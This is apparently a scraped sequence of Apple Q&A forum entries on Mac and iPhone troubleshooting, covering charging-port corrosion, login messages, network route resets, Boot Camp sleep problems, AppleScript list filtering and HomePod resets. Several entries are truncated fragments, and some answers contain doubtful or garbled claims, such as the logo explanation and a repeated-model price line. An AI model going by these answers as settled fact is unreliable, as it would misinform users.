So I have MacBook Pro 13\" 2015 and when I connect the MagSafe power connector to it, it seems like it’s more difficult to charge. So I check the MagSafe port and want to clean it I think.\nWhen I checked charge port I think it got corroded, or I don't know what it is, but I think it isn’t burnt. So I'm afraid to charge the MacBook, and I do some first aid to try to clean it with cotton swab with alcohol but it shows nothing.\nBut what should I do? Is this safe? Should I just continue to use it and charge it? Or should I bring it to an Apple Authorized Service shop or just any common non-Apple service center?\nThank you!\n\n\n\nA: The iron / ferric portions of the MagSafe port is something that will corrode when exposed to oxygen. The quality of your pictures is excellent and all are operationally normal and safe since the 5 central pins are clear, not corroded and not obstructed. \nYou do have a pretty severe amount of corrosion, so that might implicate the environment having salts and high humidity. If so, the insides are also likely to corrode, but not simply because the outside is rusted.\nThe corroded portions are not part of the electrical charge / ground / function and only cosmetic so unless your 5 pins are stuck with debris and don't have spring pressure or the corrosion / lifting of the plastic shield prevent good contact, I would ignore that entirely.\nYou could place a new adhesive shim or consider painting (very carefully) the area since a thin layer of paint won't affect the magnetic pull or the function unless / until that paint is a physical barrier at one of the corners or covers the pins and springs.\nReplacing that part might be $30 if you buy new service parts and much cheaper if you can get that part used from Mac that has other issues (broken screen, liquid damage not to the charge board.\n", "Q: How can I add a custom message in the macOS login screen? Our community group has just had three Apple Macs donated to us. Two are laptops with macOS Sierra installed and one is an iMac with macOS High Sierra installed.\nI’ve been asked to add a custom message to the login screen acknowledging the donation, but I am not familiar with Apple Macs. It only needs to be a simple message like:\n\nThis Mac was kindly donated by X.\n\nIs there a way of doing this without having to use any 3rd party software? I would need some very clear steps.\n\nA: In the Terminal:\nsudo defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"Your Message Here\"\n\n\nA: This can be done without 3rd party app. Simply open System Preferences.app -> Security & Privacy -> Show message when the screen is locked.

For some time now, I have been looking for a macOS tool that allows me to group apps similar to the upcoming Sets feature in Windows 10.\nSo far, my search has been fruitless and I have been considering diving into app development for macOS to see if I can build it myself, but I strongly suspect that Apple does not support 'wrapping' applications like this.\nDoes anyone know of anything similar?\n\nA: I don't think an existing utility exists that is exactly like the upcoming Sets feature in Windows 10.\nOn the other hand, I cannot see why you suspect that Apple does not support \"wrapping\" applications like that. The Sets feature sounds like a window manager.

As you can see in this image, even though all three of those files are set to open with Sublime Text by default, they retain painfully ambiguous icons. \nWhat I would like is some way to simply set a default image for a file extension, regardless of default application. Say that I want to set the Sublime Text icon for .py extensions and the TextEdit icon for .txt and .tsv extensions. The result should look like this.\nSo far, I've tried setting the icon through the default application, which is the only solution I could find so far aside from changing the icon on a file by file basis, with no luck. I attempted this by changing the CFBundleTypeIconFile for the python entry in the Sublime Text Info.plist file from PYTHON to Sublime Text. Upon reboot, the icon had not changed and sublime could no longer launch due to verification issues I think. Changed that back and tried simply replacing the PYTHON.icns file in the Sublime Text Resources folder with a copy of the Sublime Text.icns. Rebooted and no change had taken place.\n\nA: I believe that we can change this kind of icon with an app. In previous macOS releases, there were many apps (e.g, CanyBar) for these kinds of things. You can change any file type as per your liking with an app called LiteIcon which is free.\nLiteIcon\n\nA: *\n\n*\"Show Package Contents\" on the app.\n\n*Replace the icon there\n\n*Clean the icon cache.(You can use Liteicon.app to clean the icon cache.And you should disable SIP before you open Liteicon.app)\n\n*Login again.\n\n", "Q: Disable Command-Control-Q shortcut I've a MacBook w/ the following specs:\n\nVery annoyingly, CommandControlQ locks the screen.

When summoned by the home button & asked to make a call, it repeatedly plays a song from the play list. \nFor example, when I say \"Hey Siri, call my mother\" I get a response like, \"I do not know who My mother is\".\nI have rebooted the iPhone, and also reset the settings. Any suggestions?\n\nA: The issue you have when trying to use Siri to make a call by saying, \"Hey Siri, call my mother\" is that unless Siri knows who your mother is, how can 'she' call her?\nTo get around these types of issues you need to populate your Contacts app with the information (metadata) it needs for Siri to action those sorts of requests.\nBelow are a few examples of what I mean:\n\n\n*\n\n*If your mum's name is Charlene and that's how it's entered into your contacts, then saying, \"Hey Siri, call Charlene\" would work. Likewise, if you change her Contact details to Mum instead of Charlene, saying \"Hey Siri, call Mum\" should work. All of this is because Siri now knows who you're referring to.\n\n*If you have your mum's birthday in her Contact details, then saying \"Hey Siri, when is Mum's birthday\" would work. Of course, if you have no birth date listed, Siri has no way of answering this question.\n\n*If you don't have a 'home' address entered in your contact details, then saying \"Hey Siri, direct me home\" isn't going to work.\n\n*If you don't have an 'email' address entered in your Dad's contact details, then saying \"Hey Siri, email Dad about dinner\" isn't going to work.\n\n\nIn all of the above examples, the only way Siri can action a request accurately is by knowing the necessary information. And the only way Siri can know that information is if you've provided it somewhere to begin with, such as in your Contacts app.\nIf you specifically want to be able to say the words, \"Hey Siri, call my mother\" then you'd have to do something like change her contact details so her name was listed as \"My Mother\".\n\nA: If this is an older phone, I might suspect something with the microphone. Maybe it's damaged or obstructed in some way. Before looking into that I would backup and restore the device.\n", "Q: iPhone 6 GPS problem on Pokemon Go Recently when I'm playing Pokemon Go I get a message saying I don't have a GPS signal. Some people told me it could happen because the battery is pushing on the GPS component in the iPhone 6 model. \nIs this a known problem? Do I need to replace the battery? \n\nA: Make sure you have wi-fi switched on if you don't already. It doesn't need to be connected to an access point.\nFor some reason I get the GPS error even with a good GPS fix if I have my wi-fi switched off.\n", "Q: High Sierra 10.13.4 Mission Control Hot Corners Broken I have a 27\" iMac Retina (Late 2015, 3.2GHz i5, 24GB, Radeon R9) with HDMI secondary screen on a Thunderbolt/HDMI adapter.  I use Mission Control to put 4 workspaces on the main monitor, and switch back and forth using control-arrow keystrokes.  This still works, but screen hot corners to view Mission Control, Desktop, etc. do not work any more.  Also, I use auto-hide for the task bar, and moving the mouse to the bottom of the screen no longer pulls up the task bar -- as of today, I have to click at the bottom.\nEverything had been working fine until a recent High Sierra update (maybe 1-2 updates ago?).  When problems first started, I deleted ~/Library/Preferences/com.apple.dock.plist and restarted Dock a few times, and eventually got things working again.\nToday, none of that has helped: hot corners doesn't work, auto-hide taskbar only works with a mouse click, and I can't click and move windows after I use a keyboard shortcut to show the Mission Control overview.  (I can select a window in the overview and it gets popped to the top of the stack, but I can't click-and-drag windows any more.)\nIt looks like there's something wrong with the mouse (a Razer connected by USB), but an old generic USB mouse doesn't work any differently.  So perhaps the problem is in mouse / UI handling?\nI also have a couple of MacBook Pros which have all the same updates (I think) but the magic trackpad shortcuts to show Mission Control haven't had any problems, and I think Bluetooth mice attached to them are working OK (have to check to be 100% sure).\nI have had some other trouble with some user input on the iMac: I use VMWare virtual machines, and both Win10 and Linux guests sometimes miss key-up events, so I either get control/alt/shift stuck down, or I get keys repeating (or both).  Clicking the affected key a couple of times usually fixes this.  I also use VMWare and Parallels on the MBPs with no problems.\nAre there any known problems with UI on iMac on recent High Sierra?  Any workarounds?\n\nA: Apple Support was willing to help me troubleshoot, even though I don't have a current support contract.  We tried several things, and eventually determined that a desktop/window manager add-on called Magnet was messing up the UI events.  (I had tried just turning off the add-on, but that didn't work.)  It was some other troubleshooting step, including:\n\n\n*\n\n*Reset NVRAM (shutdown, power up with Opt+Cmd+P+R)\n\n*Safe-mode Boot (Restart, hold Shift during boot)\n\n*Create new admin user, log in (this helps distinguish a system problem from a particular user's preferences problem)\n\n*Disable startup items\n\n\nResetting NVRAM didn't help, but safe mode worked.  (However, safe mode turns off all graphics acceleration, so it's really slow on a Retina machine.)\nThe new user didn't show the problem, so it was clearly something in my preferences / profile.\nFinally, turning off Magnet auto-start and rebooting cleared up the problem in my user account.  I was subsequently able to turn Magnet on again, and it's working OK now.  So I suspect it was a stray preference that conflicted with an OSX upgrade, which got cleared out by the rebooting and other troubleshooting steps.\nI'm extremely grateful to Apple Support for the help!\n\nA: Turn off WindowTidy or Magnet, restart and reset NVRAM, then everything is fine. \n", "Q: Changing my iCloud account I recently just changed my Apple ID account and I want to change my iCloud account to the same email. I'm thinking of changing it. But, the only problem I have, is whether or not my app and everything on my phone will be deleted and erased when I change my iCloud account. If I change my iCloud account will all of my apps and photos be erased?\n\nA: Changing the email shouldn’t make a difference. If you delete the account and make a new one backup information could be lost.\nFrom this Apple Discussion:\n\nWhen you delete the account and choose Keep on My iPhone (iPad), contacts, calendars and other synced data will remain on your device.  When you sign in with your new ID to create your new account and choose Merge, these will be uploaded to your new account.  Synced notes and photo stream photos are exceptions to this, which is why you have to take steps to save them prior to deleting the account.\n\n\nA: If they are two separate accounts, there is no (easy) way to transfer information between them. If they are the same account, there should be no problem, but you'd need to provide more specifics.\n", "Q: How can I change the hotspot name without changing the iPhone name?

(Specific steps appreciated, vs. generalizations.)\n\n\nA: Found some old (iphone 8) information that suggested it's a syncing problem related to manual syncing, and led me to figure out this answer for the iphone X.\n\n\n*\n\n*Disconnect iPhone from iTunes.\n\n*In iTunes, delete the unwanted book from the library and move it to the recycle bin. (Note: This step might not be necessary, but I did it as an extra precaution/preemptive step. If I wanted to keep the book, then I'd just have to remember to retrieve it from the recycle bin.) \n\n*Still in iTunes, go to Edit > Preferences > Devices\n\n*Uncheck \"Prevent...from syncing automatically\"\n\n*Reset Sync History\n\n*Click OK.\n\n*Reconnect iPhone to iTunes. Wait for the synching process to complete.\n\n*In iTunes, edit preferences to manually sync again (assuming this is the state you want to revert to).\n\n\nNote: I was nervous about auto syncing because I thought it might transfer all music and all audiobooks to the phone, which I definitely did not want.

This doesn't work - perhaps because finder isn't recognizing * as a wildcard? I can remove - easily, but not characters after -.\nIs there an extant script somewhere that would do this, or is there something I'm missing from the finder option?\n\nA: This should do the trick (just edit FolderTemp to something that works):\ntell application \"Finder\"\n    set FolderTemp to alias \"Folder with all files\"\n    set allfiles to files of FolderTemp\n    repeat with i from 1 to count of allfiles\n        set CurrentFile to item i of allfiles\n        set filename to name of item i of allfiles\n        set x to offset of \"-\" in filename\n        set y to offset of \".\" in filename\n        set NewFileName to characters 1 thru (x - 1) of filename as string\n        set Extension to characters y thru -1 of filename as string\n        set NewFileName to NewFileName & Extension as string\n        set name of CurrentFile to NewFileName\n    end repeat\nend tell\n\nI hope it helps.\n", "Q: How to log wifi speed and strength?

You can look specifically for the report section in that page, which explains how to and where to save the resulting data.\nAs a TL;DR, look in Spotlight for Wireless Diagnostics and click Window in the menu bar, there go to Logs.\n", "Q: Restart network config from terminal I've been having a problem where my macbook won't reconnect to the internet after I turn off my work VPN. A simple reboot fixes this, but I was wondering if there was a way I could restart the network configs, or clear cache (not sure exactly what the problem is) from the command line - without having to do a reboot?\nI've tried the following, without success\n$ ifconfig en0 down && ifconfig en0 up\n\nIs there a way to reset the network config to whatever the default values are after a reboot?\nEdit: This doesn't happen every time, I'm not exactly sure what chain of events triggers it. \n\nA: Lack of network access after disconnecting from a VPN can be a symptom of a routing issue. If your VPN client doesn't disconnect cleanly, the gateway that directs your traffic to the virtual network can sometimes be left in place, effectively routing your traffic to a dead end.\nI'd suggest bringing your interfaces down, flushing the routing table of gateway entries, and bringing them up again:\n\n\n*\n\n*Bring your network interfaces down:\nfor i in $(ifconfig | egrep -o \"^[a-z].+\\d{1}:\" | sed 's/://'); do sudo ifconfig \"$i\" down; done\n\n\n*Flush the routing table: sudo route -n flush.\n\n*Bring your interfaces back up again: (repeat step 1 with up instead of down).\nIf you want a reusable Bash function for this that you can drop into your .bashrc (or wherever), you could save the following:\nresetroute () {\n    echo \"Flushing routes...\";\n    for i in $(ifconfig | egrep -o \"^[a-z].+\\d{1}:\" | sed 's/://');\n    do\n        sudo ifconfig \"$i\" down;\n    done;\n    sudo route -n flush;\n    for i in $(ifconfig | egrep -o \"^[a-z].+\\d{1}:\" | sed 's/://');\n    do\n        sudo ifconfig \"$i\" up;\n    done\n}\n\n", "Q: Issue with the calendar app in iPhone I am not able to see Accept/Decline option for the calendar meetings in Calendar app in my iPhone.\nHow to do i Accept/Decline meetings in calendar app in my iPhone?\n\nA: Try “Inbox”, on the bottom right.\n", "Q: Prevent iPad screen for turning off when not in horizontal orientation Is there a way to prevent iPad from going into Sleep mode when not in horizontal mode?\n\nA: You can prevent iPad from automatically going into sleep mode, by setting Auto Lock to Never.

If you want to enable these extensions, open Security & Privacy System Preferences.\n\nWhy do I have to enable an extension? Is this new in High Sierra?\n\nA: This seems to be a known issue with FUSE for OS X (and I guess sshfs uses that). Take a look here: https://github.com/osxfuse/osxfuse/issues/437\nIt is not a security issue per se, but just the system informing you that an app tried to load a system extension and that this extension was blocked (due to your system's settings).

Registered memory has ECC functionality, but not all ECC is registered.  Kingston goes on to explain the difference in the FAQ:  What is the difference between registered, unbuffered, ECC and fully buffered memory? \nSecondly, the memory you specified, the Kingston F51272F51 is not listed anywhere as being ECC.  It is listed as being Fully Buffered, however.\nFinally, looking at the \"supported systems\" for this memory on Kingston's website, Apple is nowhere to be found.

Yesterday, I realized the macbook is able to startup correctly only if the power button is held down for a long time (until the apple's logo appears). Nevertheless, the boot up takes long time and the system is extremely slow.

Two USB-C ports only\n\n\n*\n\n*one used for charging \n\n*one used to connect to a monitor\n\n*I need another one for a USB-C to ethernet adapter\n\n\nIs there a USB-C hub anywhere in existence? I can't find anything on Amazon to my amazement. I need 3 USB-C ports on my MBP. \n\nA: Your question will likely elicit opinion-based answers, but what you are looking for is a Thunderbolt 3 dock. These can include USB-C, USB 3.0, Thunderbolt 2 and 3 ports, gigabit ethernet, FireWire 800, SD card slots, HDMI, DisplayPort, audio jacks, and so on.\nPrices range from a little over $100 to more than $400, depending on what connectors and how many are included. See this page here to get some ideas, but you are looking for a Thunderbolt 3 dock.\n", "Q: Automator service does not work from Finder I have an Automator service that accepts multiple pdf files, converts them to pngs while converting a white background to transparent, and then uses a Quartz filter to invert the color of the png file.\nTo test the workflow, I added the Get Selected Finder Items action to pass the pdfs to the service. Everything works exactly as expected in this case.\n\nHowever, when I remove this action, and then use the service from the Finder services, it does not work. All of the variables point to the correct files, but the bash script does not write any files, which can thus not be passed to the Quartz action.\n\nAny ideas as to how to fix this?\n[EDIT] I have added the warnings. I think this goes wrong because when running the workflow from Automator I cannot provide input the second way.\n[EDIT 2] @boris42 pointed out that I did not add the requirement for the transparent background to my question, so I added it now.\n\n\nA: Here is a simple Automator Finder Service that will do what I understand you're trying to do. It will render PDF pages with 200 dpi as PNG images then invert colours in them.\n\nYou will notice that I left the Show this action when workflow runs turned on so you can specify the folder you want the PNG files to be in.\nHere is a test 3-page PDF file and the output this service generates:\n\nPNG files output:\n\n\nA: Ok, after looking into this some more, it turned out to be a very silly mistake. My ImageMagick installation wasn't being found by my script. Adding the path solved the problem, and I was able to simplify everything a bit. This one works from the Finder Services and does exactly what I want. I was helped by this answer: https://apple.stackexchange.com/a/119109/288589\n[EDIT] To get the right transparent background, as @boris42 mentioned, change the shell script to the new example.\n\n", "Q: Xcode displaying false code error messages ('Expected expression' and others) This is not a code-level question, per se, but a question about false code error messages.  I would have posted on Apple's developer forums, but the registration page is currently broken.\nI'm using Xcode 9.3 on macOS 10.13.4 on a Mac Mini with 16 GB of RAM.  I frequently get false code error messages even when my code is fine.  The false errors are usually Expected expression, Expected ']' and similar. Please see the examples below:\nAn example of a false error:\n\nNow I retype the same line exactly, and the false error goes away:\n\nAnother example:\n\nAs you can see, as soon as I retype the same exact code below the 'offending' line, that new line of code doesn't show an error.  As seen in the examples, I have enabled the display of 'invisible' characters to see if maybe some unprintable character was causing a problem, but I don't see anything like that.\nSomething fishy is going on here.  Am I missing something or is this a bug I need to report?\n\nA: Even though you can't see any weird characters on the screenshots (or in person) where the error is, there's actually a 'DLE' control code at the end of the line (see image):\n\nI copied the suspect text to another text editor where I discovered the control character.  I do not know how this character got there as I've been typing code and not copy/pasting from the web or other sources.\nDeleting the semicolon and everything after it all the way to the new line fixed the problem.  This and other invisible control characters really should be visible when 'view invisibles' are turned on.\n", "Q: How to setup iPads to be shared by multiple users? My school has iPads for use for students. Currently, each student has their own iPad, with their own password, and own files on it.\nBut I've seen other schools instead have laptops where students can log into any laptop (or desktop computer in the building), and use it. They just enter their unique username and password, and they see their own desktop settings and files. Only an Internet connection is required.\nIs there a way to setup iPads to be used in the same manner?\n\nA: iPads, by their nature are single user devices. One could go on and on about why that is or is not a good thing. But the fact remains that currently iOS does not offer multiple logins, like you can get on any Windows PC, or any Macintosh.\nApple does offer Apple School Manager that may give you some or most of what you are looking for. Perhaps someone with actual familiarity with this program could chime in or provide a more complete answer, but that link should at least get you started.\n", "Q: 2009 MacBook Air: I can, and want to, purchase an SSD upgrade, but what about Mavericks > Sierra? I have a 2009 MacBook Air with Mavericks. (It’s old, but low miles.) I was about to pull the trigger on buying a SSD to improve performance, but I just now learned that I won’t be able to upgrade to Sierra (?). Only 2010 and later models for MacBook Air are supported according to apple.com.\nhttps://www.apple.com/macos/how-to-upgrade/\nI’m floored. Am I really stuck with Mavericks forever? Should I just forget about upgrading the hard drive, since I cannot install Sierra anyway? Is the pitiful 2 GB of RAM (which cannot be upgraded ☹️) unable to handle any more OS’s? \nWhat can I do, then, with this perfectly ok, if painfully slow, machine? Has anybody done this against recommendation and had it turn out ok?\nFWIW, my primary use for this machine is going to be development work, i.e., self-study, writing & testing scripts in the terminal, etc. I don’t do much gaming, video, or heavy graphics, etc.\n\nA: Replacing your rather slow spinning HD with an SSD will certainly make your Mac faster. It is the one upgrade that will give you a noticeable speed bump. Other things can give you some speed like RAM , but that is not an option for you.\nThat said Apple does not support upgrading to Sierra (though there are hacks that will allow you to do so, which is beyond the scope of this site.)\nYou can not know if the upgrade will support your usage without trying it. Personally, 2 GB of RAM is considered pretty small these days and I would be hesitant to upgrade the OS because of that. But depending on your use case it might be acceptable in combination with the SSD upgrade.\n", "Q: How to see 6-digit file permissions? I have an application that complains about the permissions of its directory inside of /Applications.  It wants to be set to 040775.  I can fix it by running chmod 040775, but I do not understand what the first 2 digits mean.  Just running chmod 775 does not work, so apparently these first 2 digits are wrong.  What are these 2 digits, and how can I view them in macOS?  I'm looking for something like ls -l.  I'm running High Sierra.\n\nA: The short answer is stat and ask for permissions field:\nstat -f \"%p\" file\n\nThat application or instructions or memory is likely wrong.

I have an individual apple developer account. I bought it mainly so I could use a few of the advanced APIs (e.g. NetworkExtensions) in an app that I’m testing/developing. There’s another programmer with whom I collaborate. I want him to also have access to the app so I assigned him the “App Manager” role in iTunes Connect. However, I’m unsure about what he has to do afterwards so that he can work on the same app as me. Can he directly fork the project and access the APIs? Does he need certificates?\n\nA: iTunes Connect is a separate service from the Apple Developer portal. Development privileges are not assigned via iTunes Connect.\nAdditionally, since you are using an individual developer account, there is no way to grant another registered Apple Developer access to your team. That functionality is only available to Organisation account.\nThe problem can be solved in part by granting your colleague access to your code repository. That way you both can collaborate over code. If you want him to test the app on device, you can choose to export your identity on to his machine (Recommended only if you trust him with this thing).\n", "Q: Apple logo never lighted up! The Apple logo on my MacBook was never ever lighted up since I purchased it over a year ago. I was under the impression that some models are made this way, but on checking out how to turn it on, I'm learning that perhaps all models come with the lighted function and the common challenge lies in turning the light off. How could this be? I had placed a white Apple sticker that came with it on the cover, but now I'm feeling that I might have gotten a defective unit....what do you think? \n\nA: No current model of MacBook or MacBook Pro has a logo that lights up. Apple had to give it up in order to make thinner screens. The 13” MacBook Air is the only one left that lights up. \n\nA: Your laptop has no light up functionality. I know this because if you can turn on your screen which I'm assuming you can the backlight would turn on and in turn light up your logo if your logo had the ability to light up.\nWhy would you deface a beautiful product with an apple sticker????? \nThe light up logo uses the same light as the backlight for the screen. I believe it was a design choice to not have the logo light up and has nothing to do with making the screen thinner. \n", "Q: Bootcamp isn't allowing me to install Windows 7 How can I hack the Bootcamp plist (or other) so it will allow me to select and install a Windows 7 ISO. \nCurrently it's minimum Win OS is set at Windows 8 + but my DVDs, licence and backups are essentially all Win 7.\nEl Capitan 10.11.6\nThanks\n\nA: These types .plist hacks are pointless. Usually, the OP wants to create a USB Windows installer, but the Mac requiring the hack can not boot and install Windows from the created USB installer. This is why Apple normally prevents the user from creating the USB installer in the first place. \nFurthermore starting in 2015, Apple starting shipping Macs with the BIOS removed from the firmware. Windows 7 require a BIOS boot method. So, if you have 2015 or newer Mac, you probably will not be able to install Windows 7.\nIf the minimum Windows is 8+, then Apple has not provided the necessary drivers for Windows 7. In other words, you usually can use the Windows 7 drivers to install Widows 10, but the Widows 10 drivers probably will not work with Windows 7.\n", "Q: Applescript remove Missing value and unwanted data I created a script to return some credit card informations from an internal website\n                            <a href=\\\"/web/Support.aa/aa/g55erefesfsfsf/4.g.g.5.24.54\\\">\n                                CC<br>Info\n                            </a>\n\n                    \", \"\n\n                            Visa (9999)\n\n                    \", \"\n\n                            Visa (8888)\n\n                    \", \"\n\n                            Visa (7777)\n\n                    \", \"\n\n                            Visa (666)\n\n                    \", \"\n\n                            Alipay\n\n                    \", missing value, missing value, missing value}\n\nI have two issue with my script,\n\n\n*\n\n*I can't get rid of the first link with is not a CC numbers\ntried :\nset myRawData to items 2 thru -1 of myRawData as string\nbut don't seems to work.\n\n*I don't manage to remove all the missing values.\n\n*Can I remove some entry from the list that contain \"none\" ?\nHere is my full script\ntell application \"Google Chrome\"\n    tell active tab of window 1 to set myRawData to execute javascript \"var outPut=[]; var arr=document.getElementsByClassName('sortable fraudScoringTransactionCCSummary');for (var i in arr) {outPut.push(arr[i].innerHTML)};outPut;\"\nend tell\n\n## set myRawData to items 2 thru -1 of myRawData as string -- not working\nset myNewList to {}\n\nrepeat with each from 1 to count of items of myRawData\n    set itemOnMyList to item each of myRawData\n    if itemOnMyList is in myRawData and itemOnMyList is not in myNewList then set end of myNewList to itemOnMyList\nend repeat\n\n## not sur\n##set myNewList to items 2 thru -1 of myNewList  -- not working\n\nset countHowManyCC to count myNewList\n\n\nreturn countHowManyCC\n\n\nA: Using the returned output information posted in your OP while adding the missing opening curly brace and a opening double quote {\" so as to have it compile as a list, the following example AppleScript code filters out the first item of the list as well as the items containing missing value in order to return a count of items that represent the data. \nset myRawData to {\"<a href=\\\"/web/Support.aa/aa/g55erefesfsfsf/4.g.g.5.24.54\\\">\n                                CC<br>Info\n                            </a>\n\n                    \", \"\n\n                            Visa (9999)\n\n                    \", \"\n\n                            Visa (8888)\n\n                    \", \"\n\n                            Visa (7777)\n\n                    \", \"\n\n                            Visa (666)\n\n                    \", \"\n\n                            Alipay\n\n                    \", missing value, missing value, missing value}\n\n\nset myRawData to items 2 thru -1 of myRawData\n\nset myNewList to {}\nrepeat with i from 1 to count myRawData\n    if item i of myRawData does not contain missing value then\n        copy item i of myRawData to end of myNewList\n    end if\nend repeat\n\nreturn count myNewList\n\nThe following example AppleScript code adds a second filter to handle items containing \"none\":\nset myRawData to items 2 thru -1 of myRawData\n\nset myNewList to {}\nrepeat with i from 1 to count myRawData\n    set thisItem to item i of myRawData\n    if thisItem does not contain \"none\" then\n        if thisItem is not missing value then\n            copy item i of myRawData to end of myNewList\n        end if\n    end if\nend repeat\n\nreturn count myNewList\n\n\nNote: The example AppleScript code is just that and does not employ any error handling and is meant only to show one of many ways to accomplish a task.

I recently created Windows partition with Boot Camp which is running a clean install of Windows 10.\nWhen I tell Windows to go to sleep, it will do so. However, it doesn't seem possible to wake it from sleep. While the screen backlight lights up, it remains black and blank, whatever input is given.\nThe only way to get a functioning environment to return is to hard restart the computer holding down the power button. \nI have gone to Device Manager to check whether the keyboard, mouse, etc. are all set to wake the computer from sleep. They are.\nIs there any way to resolve this?\n\nA: I'd really like to post this as a comment because it isn't really an answer - but I don't have the available rep.\nI'm having the exact same issue (in terms of failing to wake from sleep). I'm here from Google - on a Mid 15 rMBP. It happens on both Windows and a Linux distribution (Ubuntu 16.04 LTS), but not on macOS. I am having a similar symptom. That is: the haptic feedback on the touchpad remains active. The device never wakes up, either on a keystroke, clicking the touchpad or pressing the power button.\nI have attempted to reset both the SMC and PRAM to no avail. May I suggest attempting that and seeing how you go?\nThe only potential explanation I have come across is that the symptoms developed after I installed an OWC Aura aftermarket SSD. That said, I was not using boot camp immediately prior to installing the OWC SSD. I contacted OWC's support and they have had no reports. Do you by any chance use one of these? I haven't had the time to switch back to my OEM SSD. \n\nA: Windows has a command called Powercfg that can modify how devices control the sleep state. First, query the list of devices that support awaking your system:\npowercfg /devicequery wake_programmable\n\nPay attention to all the devices including the word \"keyboard\" in their name.\nFinally, use the option /deviceenablewake \"<device_name>\" to enable the device that should wake your system from sleep. For example:\npowercfg /deviceenablewake \"HID Keyboard Device\"\n\n\nA: This is not an answer, but I do see the same problem on all Mac hardware when I use bootcamp+windows. I tried to call Apple support, but all I get from them is that it's a windows issue (and I've never seen anything like that in windows). I'm absolutely positively sure that it's an apple bug/issue.\nThe problem I have is that after my 2019 mac mini goes to sleep I absolutely cannot turn on my screen. Screen shows \"no signal\" message. I tried to unplug hdmi cable, plug it back in: nothing helps, hardware stays in off state completely. The only solution is a hard reset. Also, I've seen where usb devices do not wake up after computer goes to sleep mode: usually, in that case my keyboard is not responding to any keystrokes as if computer is off, pressing CapsLock doesn't change led indicator etc. But if I unplug it from usb port and plug it back in, then it works.\nSo far, what I see, is that mac hardware somehow does not properly turn it on devices, even though the OS actually does make the request to wake it up. Here's how you can check: when your computer (I assume it's in Windows/bootcamp) is asleep, try to remotely login into it. It's not going to work (unless you have wake-on-lan or something like that, but let's assume that you don't have wake-on-lan). Now, try to press space bar to wake up your pc and even if it still appears to be asleep, it's actually isn't asleep: you'll be able to remotely login into it and use it as if it's not asleep. Except, there is some hardware issue with macs/bootcamp that actual hardware isn't switched to powered state.\nI have macbook pro 15/16 multiple models, and I have mac mini 2019 and with all of them I saw that issue happening from time to time, but with my mac mini it's so severe that I have no choice but to configure windows to prevent it from going into sleep mode.\n\nA: I've just gone through this on a Dell Precision M3800.\nrunning powercfg /devicequery wake_programmable returned lots of ambiguous device names, including lots of USB Hubs (the system internals contain two plus I was an external USB-C hub for desktop monitors etc.) but no matter what I did with an external wired keyboard+wireless Mouse or wireless keyboard/Mouse combo they wouldn't show up in Powercfg.\nThe only devices wake_armed were\npowercfg -devicequery wake_armed\nIntel(R) Dual Band Wireless-AC 7260    \nDell GigabitEthernet\n\nNone of the HID devices in Device Manager had a power management tab.\nTo fix it, I did a full shutdown on Windows 10, CMD/Admin prompt via\nshutdown /s/r\n\nThen I went into Bios setup via F2 on startup before Windows 10 loaded.\nIn Bios setup there was a USB Wake Support option, it was disabled.

It is because even though your MacBook screen is black after sleep, it's because the screen brightness is off. Sometimes for some reason, the brightness gets set to the lowest and nothing shows on the screen because the brightness is off. So, when that happens, just press the brightness button and make your screen brighter. Then, you should see the screen.\nI don't know if this is a bug, but it worked for me.\n\nA: I know this is an old question but the other answers got me thinking, windows have a sleep hard disk option in power settings. It is possible that functionality doesn't play well with the SSD in Macbook Pros.\nI made this change in the Power Options -> Advanced Settings to set turn off hard disk to 'never' and the issue is solved on my 2015-MBP.\n\n", "Q: Safely dispose of dead iPhone I have an iPhone 6 which is completely dead (black screen whatever I try).

Is that possible?\n\nA: The MacEnterprise list has discussed this topic recently, Forcing Log-Off For Idle Users.\nautologout Defaults\nJohn NcNair suggested the following autologout defaults:\ndefaults write /Library/Preferences/.GlobalPreferences com.apple.autologout.AutoLogOutDelay -int 900 \ndefaults write /Library/Preferences/.GlobalPreferences com.apple.securitypref.logoutvalue -int 900 \n\nLimitations\nBruce Carter mentioned...\n\nNote that nothing using Apple's internal mechanism for this will work if \n  the user has unsaved files open.  It will simply stop at the dialog box and \n  time out.\n\nSee the related question How can I automatically log out the guest account after a period of inactivity? for other approaches and tools.\n", "Q: No longer able to AirPlay from iTunes to Homepod directly I want to AirPlay music from Mac iTunes to HomePod. However, when I select it on iTunes AirPlay menu, I get \"Sign in to Apple Music to play songs on your HomePod\" prompt with Cancel/Sign in buttons. If I sign in, nothing happens and I get the same prompt on the next attempt. \nHow do I get this to work? I do not have Apple Music nor iTunes Match subscription and I don't think I need one for this.\nIf I choose AirPlay for the whole Mac instead of iTunes, it works. But I would like to AirPlay iTunes only instead.\nWhat makes it even more interesting that my desired setup worked for the first few days after setting up HomePod and then stopped.\n\nA: Since you're saying this used to work the way you want it to, then perhaps resetting the HomePod back to its default settings will do the trick.\nTo fully reset it, follow these steps:\n\n\n*\n\n*Unplug the HomePod\n\n*Wait at least five seconds and then plug it back in\n\n*Wait at least another five seconds\n\n*Press and hold the top of the HomePod with your finger\n\n*Keep your finger there even after the spinning light turns red\n\n*Continue to keep your finger there even after Siri announces that HomePod is about to reset\n\n*Finally you will hear three beeps to indicate that your HomePod has been reset\n\n*You can now take your finger off\n\n\nOnce your HomePod is reset you will need to set it up again from scratch.\n", "Q: Macbook A1181 Shuts down after a few minutes My dinosaur macbook randomly shuts down. I've reset the SMC and it still shuts down. Even the computer doesnt know its coming because you can hear the arm inside the hard drive clunk as it shuts down. If you leave it sit it will last longer on the next startup. Sometimes it wont even make it to the startup chime.\n\nA: Try to boot macOS from external Hard Drive or SSD. If it's stable your internal disk is damaged.\nRead about external startup here.\n\nA: Your MacBook is anywhere from 8 to as much as 11 years old. In my experience, you are looking at hardware failure. This is difficult to diagnose online and may be impossible to solve in a laptop form-factor, depending on what has failed.\nI would start with a full Apple Hardware Test. You will likely need the discs that came with your computer or a 10.6 or earlier Applications Install Disc 2. This doesn't always catch hardware failures, but when it does, it can help you figure out how to fix it.\nIf this produces no information, you may need to open the case and confirm that all the internal connectors and wiring is securely attached and not damaged in any way. Look for cracks in the logic board. Confirm no debris is inside the case. Check to make sure RAM is securely inserted.\nIf you don't find anything obvious, I've heard anecdotal evidence that suggests old, cracked thermal paste on the CPU or GPU.\nAt this point, I would start to consider buying a new MacBook. If you were comfortable with your MacBook's processing power and speed, you can get a MacBook or MacBook for around $999. If you go refurbished, you are currently looking at something as low as $849.\n(As an aside, there could be an issue with the battery or power adaptor. This is tough to troubleshoot as it requires a purchase of a new battery and/or power adaptor, which can be more than $100. I see that as $100 that could go to a new MacBook, so I can't say I 